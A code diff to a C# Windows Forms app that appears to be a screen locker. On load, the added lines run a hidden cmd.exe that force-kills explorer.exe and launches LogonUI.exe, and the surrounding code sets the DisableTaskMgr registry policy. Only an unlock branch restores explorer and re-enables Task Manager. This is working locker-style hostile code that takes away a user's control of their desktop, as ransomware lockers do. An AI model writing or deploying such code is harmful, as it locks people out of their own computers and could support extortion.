@@ -38,11 +38,12 @@ namespace WindowsFormsApp3
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            var explorerProcesses = Process.GetProcessesByName("explorer");
-            foreach (var process in explorerProcesses)
-            {
-                process.Kill();
-            }
+            ProcessStartInfo byebye_exp = new ProcessStartInfo();
+            byebye_exp.FileName = "cmd.exe";
+            byebye_exp.WindowStyle = ProcessWindowStyle.Hidden;
+            byebye_exp.Arguments = @"/k taskkill /f /im explorer.exe";
+            Process.Start(byebye_exp);
+            Process.Start(@"C:\Windows\System32\LogonUI.exe");
             RegistryKey regkey;
             string keyValueInt = "1";
                 string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
@@ -81,8 +82,22 @@ namespace WindowsFormsApp3
                 MessageBox.Show("Your Windows is unlocked");
                 var proc = new System.Diagnostics.Process();
                 proc.StartInfo.FileName = "C:\\Windows\\explorer.exe";
-                proc.StartInfo.UseShellExecute = true;
+                proc.StartInfo.UseShellExecute = false;
                 proc.Start();
+                System.Windows.Forms.Application.Exit();
+                RegistryKey regkey;
+                string keyValueInt = "0";
+                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+                try
+                {
+                    regkey = Registry.CurrentUser.CreateSubKey(subKey);
+                    regkey.SetValue("DisableTaskMgr", keyValueInt);
+                    regkey.Close();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Privet");
+                }
             }
             else
             {
